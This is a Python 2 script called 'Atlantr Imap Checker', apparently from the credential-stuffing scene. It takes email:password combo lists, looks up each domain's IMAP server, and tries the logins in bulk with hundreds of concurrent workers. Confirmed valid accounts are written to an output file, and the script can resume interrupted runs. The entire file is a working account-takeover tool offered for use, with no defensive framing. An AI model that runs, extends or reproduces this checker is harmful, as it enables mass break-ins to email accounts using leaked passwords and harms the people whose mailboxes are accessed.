#!/usr/bin/python
#- * -coding: utf-8 - * -
import sys
import gevent #
from gevent.queue import *
import gevent.monkey
from timeit import default_timer as timer
import random
gevent.monkey.patch_all()
import imaplib
import email
import time
from progress.bar import IncrementalBar #pip install progress
import itertools
import cPickle as pickle
import os

asciii = """
                                   
,---.|    |              |         
|---||--- |    ,---.,---.|--- ,---.
|   ||    |    ,---||   ||    |    
`   '`---'`---'`---^`   '`---'`    
      Atlantr Imap Checker v1.0 - by SUP3RIA
      
""" 

print asciii

if sys.argv[1: ]:
    file_in = sys.argv[1]
else :
    file_in = "uniq_mail_pass.txt"

if sys.argv[2: ]:
    file_out = sys.argv[2]
else :
    file_out = "new_out.txt"

if sys.argv[3: ]:
    workers = int(sys.argv[3]) + 1
else :
    workers = 800

def write(i,file_out):
    try:
        with open(file_out, 'a') as file:
            file.write('{}'.format(i+'\n'))
    finally:
        file.close()

def imap(usr, pw, host):
    usr = usr.lower()
    try:
        mail = imaplib.IMAP4_SSL(str(host))
        a = str(mail.login(usr, pw))
        return a[2: 4]
    except imaplib.IMAP4.error:
        return False
    except:
        return "Error"

def init_ImapConfig():
    global ImapConfig
    ImapConfig = {}
    with open("hoster.txt", "r") as f:
      for line in f:
          if len(line)>1:
              hoster = line.strip().split(':')
              ImapConfig[hoster[0]] = hoster[1]


def get_imapConfig(email):
    try:
        hoster = email.lower().split('@')[1]
        return ImapConfig[hoster]
    except:
        return False
   
def yes_or_no(question):
    reply = str(raw_input(question+' (y/n): ')).lower().strip()
    if reply[0] == 'y':
        return True
    if reply[0] == 'n':
        return False
    else:
        return yes_or_no("Uhhhh... please enter ")   
        
        
def save_lineCount(count):
	with open("count.p", "wb") as f:
		pickle.dump(count, f)
        
def get_lineCount():
    try:
        count = pickle.load( open( "count.p", "rb" ) )
        return int(count)
    except:
        return 0


def getunknown_imap(subb):
	#print "Checking unknown host ",subb,"for Imap.."
	sub = ['imap','mail','pop','pop3','imap-mail','inbound','mx','imaps','smtp','m']
	for host in sub:
		host = host+'.'+subb
		try:
			mail = imaplib.IMAP4_SSL(str(host))
			a = str(mail.login('test', 'test'))
		except imaplib.IMAP4.error:
			return host
		except:
			pass
	return False

def sub_worker(task):
    global count_valid 
    global count_invalid 
    global count_unmatched 
    task2 = task.split(':')
    host = get_imapConfig(task2[0])
    #if host == False:
		#o = getunknown_imap(task2[0])
		#if o != False:
		#	host = o
    if host == False:
        write(task,file_out[:-4]+'_unmatched.txt')
        unmatched = count_unmatched + 1
        return False
        #q.task_done()
    l = imap(task2[0], task2[1], host)
    if l == 'OK':
        #print task, True
        write(task,file_out)
        count_valid = count_valid + 1
    if l == False:
        #print task, False
        count_invalid = count_invalid  + 1
    if l == "Error":
        #q.put(task)
        return False

def worker():
    global line_count
    line_count = 0
    while not q.empty():
        task = q.get()
        s = True
        try:
            s = sub_worker(task)
        finally:
            if s != False:
                gevent.sleep(random.uniform(0.01,0.09))
            bar.next()
            line_count += 1
            save_lineCount(line_count)
            #q.task_done()

def loader():
    global linesSum
    linesSum = 0
    par1 = get_lineCount()
    if par1 != 0:
        yes = yes_or_no("Resume old line-count?:")
        if yes == False:
			os.remove("count.p")
			par1 = 0
    print "Loading list..."
    with open(file_in, "r") as text_file:
        for line in itertools.islice(text_file, par1, None):
            if len(line.strip()) > 1 and ':' in line.strip():
                try:
                    if '@' in line.split(':')[1] and '.' not in line.split(':')[0]:
                        a = line.split(':')[0].strip()
                        b = line.split(':')[1].strip()
                        line = b.lower()+':'+a
                    q.put(line.strip(),timeout=3)
                    linesSum += 1
                except:
                    pass


                     

def asynchronous():
    threads = []
    for i in range(0, workers):
        threads.append(gevent.spawn(worker))
    start = timer()
    gevent.joinall(threads,raise_error=True)
    end = timer()
    print "\n\nTime passed: " + str(end - start)[:6]
    print "\nFound",count_valid, "valid Accounts.","\n(",count_invalid,'invalid and for',count_unmatched,'no settings were found.)'


count_valid = 0
count_invalid = 0
count_unmatched = 0


init_ImapConfig()
q = gevent.queue.JoinableQueue()
gevent.spawn(loader).join()
bar = IncrementalBar('Processing', max=linesSum)
asynchronous()
try:
	os.remove("count.p")
except:
	pass
